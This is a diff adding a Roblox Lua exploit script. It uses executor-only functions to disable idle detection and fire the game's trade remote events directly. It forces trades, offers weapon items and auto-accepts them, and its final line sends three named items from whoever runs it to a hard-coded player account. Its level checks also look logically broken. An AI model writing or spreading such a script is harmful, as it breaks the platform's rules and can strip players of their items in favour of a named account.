@@ -1,0 +1,105 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+for i,v in pairs(getconnections(LocalPlayer.Idled)) do
+    v:Disable()
+end
+
+local AutoAcceptOffer = false
+getgenv().SafePlace = false
+
+function GetLevel(player)
+    return Players:FindFirstChild(player):GetAttribute("Level")
+end
+
+function GetPrestige(player)
+    return Players:FindFirstChild(player):GetAttribute("Prestige")
+end
+
+function OfferItem(item)
+    local args = {
+        [1] = item,
+        [2] = "Weapons"
+    }
+    ReplicatedStorage.Trade.OfferItem:FireServer(unpack(args))
+end
+
+function ForceTrade(target)
+    ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:FindFirstChild(target))
+    ReplicatedStorage.Trade.AcceptRequest:FireServer()
+end
+
+function IsInTrade()
+    return LocalPlayer.PlayerGui.TradeGUI.Container.Trade.Visible or LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Visible
+end
+
+function AutoAcceptOfferLoop()
+    while true do
+        if AutoAcceptOffer then
+            if LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Accepted.Visible or LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.TheirOffer.Accepted.Visible then
+                ReplicatedStorage.Trade.AcceptTrade:FireServer()
+                print()
+                AutoAcceptOffer = false
+            end
+        end
+        task.wait()
+    end
+end
+
+local AutoAcceptOfferCoroutine = coroutine.create(AutoAcceptOfferLoop)
+coroutine.resume(AutoAcceptOfferCoroutine)
+
+function Deposit(player)
+    local success, error_message = pcall(function()
+        if not player then return end
+        if not (GetLevel(LocalPlayer.Name) > 9) and not (GetPrestige(LocalPlayer.Name) == 0) then
+            print("You need to be at least level 10.")
+        else
+            if not (GetLevel(player) > 9) and not (GetPrestige(player) == 0) then
+                ForceTrade(player)
+                AutoAcceptOffer = true
+            else
+                print("The player need to be at least level 10.")
+            end
+        end
+    end)
+    if not success then
+        print(error_message)
+    end
+end
+
+function Withdraw(player, item1, item2, item3, item4)
+    local success, error_message = pcall(function()
+        if not player then return end
+        if not (GetLevel(LocalPlayer.Name) > 9) and not (GetPrestige(LocalPlayer.Name) == 0) then
+            print("You need to be at least level 10.")
+        else
+            if not (GetLevel(player) > 9) and not (GetPrestige(player) == 0) then
+                ForceTrade(player)
+                task.wait(2)
+                --repeat task.wait() until IsInTrade()
+                if item1 then
+                    OfferItem(item1)
+                end
+                if item2 then
+                    OfferItem(item2)
+                end
+                if item3 then
+                    OfferItem(item3)
+                end
+                if item4 then
+                    OfferItem(item4)
+                end
+                AutoAcceptOffer = true
+            else
+                print("The player need to be at least level 10.")
+            end
+        end
+    end)
+    if not success then
+        print(error_message)
+    end
+end
+
+Withdraw("Maxdenarb", "Wanwood", "Tiger", "Stalker")
